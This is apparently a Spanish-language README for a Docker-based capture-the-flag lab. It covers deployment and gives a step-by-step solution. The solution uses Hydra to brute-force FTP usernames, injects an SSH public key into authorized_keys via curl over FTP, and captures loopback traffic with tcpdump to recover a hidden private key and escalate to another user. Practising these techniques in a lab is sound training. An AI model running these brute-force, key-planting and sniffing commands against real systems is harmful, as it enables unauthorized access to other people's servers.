# SSHarknet

- [1. Instalación y despliegue](#1-instalación-y-despliegue)
- [1.1. Despliegue automático](#11-despliegue-automático)
- [1.2. Despliegue manual](#11-despliegue-manal)
- [2. Descripción de ejercicio](#2-descripción-de-ejercicio)
- [3. Solución de ejercicio](#3-solución-de-ejercicio)
- [3.1. Identificación de servicio FTP](#31-identificación-de-servicio-ftp)
- [3.2. Crackeo de credenciales FTP](#32-crackeo-de-credenciales-ftp)
- [3.3. Conexión al servidor](#33-conexión-al-servidor)
- [3.4. Búsqueda de la flag](#34-búsqueda-de-la-flag)
- [3.5. Interpretación de tareas programadas](#35-interpretación-de-tareas-programadas)
- [3.6. Intercepción de tráfico interno](#36-intercepción-de-tráfico-interno)
- [3.7. Análisis de tráfico](#37-análisis-de-tráfico)
- [3.8. Descompresión de archivo](#38-descomprensión-de-archivo)
- [3.9. Lectura de la flag](#39-lectura-de-la-flag)

## 1. Instalación y despliegue

Para desplegar el laboratorio es neceario tener [Docker](https://docs.docker.com/get-docker/) instalado. Una vez instalado podremos descargar la imagen o construirla.

### 1.1. Despliegue automático

Para desplegar el contenedor automáticamente bastará con ejecutar el siguiente comando:

```bash
docker run -d --name ssharknet -p [HostPort1]:21 -p [HostPort2]:22 -p [HostPortRange]:40000-40010 kradbyte/ssharknet:latest
```

Asegúrate de reemplazar `HostPor1`, `HostPort2` y `HostPortRange` con los puertos para los servicios FTP, SSH y FTP Passive, respectivamente, en caso de querer utilizar puertos personalizados.

### 1.2. Despliegue manual

Para desplegar el contenedor manualmente primero deberemos clonar el repositorio y construir la imagen:

```bash
git clone https://github.com/oppaisdf/elemental-labs.git
docker build -t kradbyte/ssharknet:latest elementals-labs/4-SSHarknet
```

Una vez tengamos la imagen construida podremos desplegar el contenedor:

```bash
docker run -d --name ssharknet -p [HostPort1]:21 -p [HostPort2]:22 -p [HostPortRange]:40000-40010 kradbyte/ssharknet:latest
```

Asegúrate de reemplazar `HostPor1`, `HostPort2` y `HostPortRange` con los puertos para los servicios FTP, SSH y FTP Passive, respectivamente, en caso de querer utilizar puertos personalizados.

## 2. Descripción de ejercicio

Accidentalmente eliminaste el archivo “flag” de tu ordenador, y aunque lo buscaste en la papelera, no lo encontraste. Sabes que se realizan respaldos en el servidor periódicamente, así que es probable que encuentres tu archivo allí. Durante el almuerzo, escuchaste por casualidad que la contraseña del servidor fue cambiada a “winter”, lo que te da la oportunidad de acceder al servidor y buscar tu archivo sin que nadie se entere.

*Target*
Recuperar el archivo “flag” que perdiste.

*Steps*
1. Ingresa al servidor utilizando las credenciales disponibles.
2. Busca el archivo perdido.
3. Verifica las tareas programadas de respaldos.
4. Intercepta y descifra los paquetes de red.
5. Escala tus privilegios.
6. Recupera el archivo “flag”.

*Grants*
1. Los servicios del servidor operan en un rango de puertos entre 2000 y 2300.
2. Una vez interceptado el tráfico del servidor, filtra por HTTP y examina los archivos adjuntos en las solicitudes.

*Tools*
Nmap, Hydra, FTP/curl, SSH, tcpdump, WireShark.

## 3. Solución de ejercicio

### 3.1. Identificación de servicio FTP

Si se configuraron los puertos para que el servicio FTP corriera por un puerto distinto al 21, se debe utilizar alguna herramienta de escaneo para descubrir dicho servicio.

```bash
nmap -sn 192.168.0.0/24
```

### 3.2. Crackeo de credenciales FTP

Una vez hayamos ubicado el servicio FTP, en la descripción se menciona que podemos subir un archivo al sevidor, pero primero deberemos descubrir el usuario. Para eso podemos utilizar herramientas como *Hydra*, que nos ayudarán a descubrir las credenciales. Podemos utilizar algún diccionario de [SecList](https://github.com/danielmiessler/SecLists/blob/master/Usernames/cirt-default-usernames.txt).

```bash
hydra -l /ruta/a/tu/diccionario.txt -p winter ftp://ServerIP:ServerPort
```

No olvides reemplazar `ServerIP` y `ServerPort` con la IP y el puerto del servidor por donde corre el servicio FTP, así como la ruta de tu diccionario.

### 3.3. Conexión al servidor

Si ingresamos al servidor con FTP notaremos que podremos inyectar un archivo en la carpeta de usuario `.ssh`, por lo que podremos inyectar nuestras propias llaves SSH para conectarnos remotamente. Para ello deberemos generar nuestras llaves SSH en nuestro host:

```bash
ssh-keygen -t rsa -b 4096 -f key -N ""
```

Una vez tengamos nuestras llaves creadas bastara con enviar la llave pública al servidor:

```bash
curl -T key.pub ftp://User:winter@ServerIP:ServerPort/.ssh/authorized_keys
```

No olvides reemplazar `User` con el usuario que hayas encontrado, así como como `ServerIP` y `ServerPort` con la IP del servidor y el puerto donde corre FTP en caso se haya especificado algún otro distinto al 21 al momento de lanzar el contenedor.
Una vez hayamos enviado la llave pública podremos conectarnos por SSH:

```bash
chmod 600 key
ssh -p ServerPort -i key User@ServerIP
```

No olvides reemplazar `ServerPort` y `ServerIP` por la IP del servidor y el puerto por el que corre SSH.

### 3.4. Búsqueda de la flag

Cuando hayamos ganado acceso al servidor podremos buscar el archivo que buscamos:

```bash
find / -name \*flag\* 2>/dev/null
```

Al encontrar el archivo podremos intentar leerlo, pero al verificar sus persmisos notaremos que solo es accesible para otro usuario, por lo que deberemos buscar una forma de escalar privilegios.

### 3.5. Interpretación de tareas programadas

Si navegamos hasta las tareas cron notaremos que hay ciertas tareas realizadas por otros usuarios, como un servidor HTTP o un backup. 
Al encontrar un servicio HTTP podríamos intentar capturar el tráfico interno de la red para ver qué podemos encontrar al respecto.

### 3.6. Intercepción de tráfico interno

Para capturar el tráfico interno utilizaremos tcpdump con la interfaz *loocback*.

```bash
tcpdump -i lo -w trafic.pcap
```

Guardaremos el tráfico en un archivo para analizarlo posteriormente, porque al ver el tráfico en tiempo real no podremos manipular los paquetes.
Una vez hayamos interceptado el tráfico durante al menos cinco minutos verificaremos que el archivo sí tenga información, de lo contrario capturaremos nuevamente el tráfico.

### 3.7. Análisis de tráfico

Cuando tengamos el tráfico interceptado analizaremos dicha captura con WireShark, pero primero deberemos pasar el archivo a nuestro host, por lo que en nuestro host ejecutaremos:

```bash
curl -o data.pcap ftp://User:winter@ServerIP:ServerPort/trafic.pcap
```

Reemplaza `User` por el usuario encontrado en etapas anteriores, así como el `ServerIP` y `ServerPort` con la IP del servidor y el puerto por el que corre FTP.
Cuando hayamos descargado el archivo podremos analizarlo con WireShark. Una vez abierto el archivo del tráfico que capturamos, deberemos filtrar por HTTP y entre todas las solicitudes que aparezcan deberemos inspeccionar para ver qué se tramita.

### 3.8. Descompresión de archivo

Entre los paquetes encontraremos una petición de un archivo. Dicho archivo contiene un bloque de cadenas que, al analizar detenidamente, nos daremos cuenta que se trata de un archivo comprimido en formato hexadecimal en columnas. Deberemos copiar todas las líneas del archivo y guardarlas en un nuevo archivo, para convertir esas cadenas en el archivo comprimido. Una vez tengamos el archivo podremos convertir esas cadenas en el archivo comprimido:

```bash
xxd -p -r ArchivoEncontradoEnCaptura.txt > file.tar.gz
```

Al tener el archivo comprimido lo podremos descomprimir de forma normal:

```bash
tar -xzf fil.tar.gz
```

### 3.9. Lectura de la flag

Al tener el archivo descomprimido notaremos que dicho archivo contiene una llave privada, por lo que al intentar conectarnos a otros usuarios llegaremos a conectarnos al usuario que tiene permisos de lectura de nuestro archivo flag.
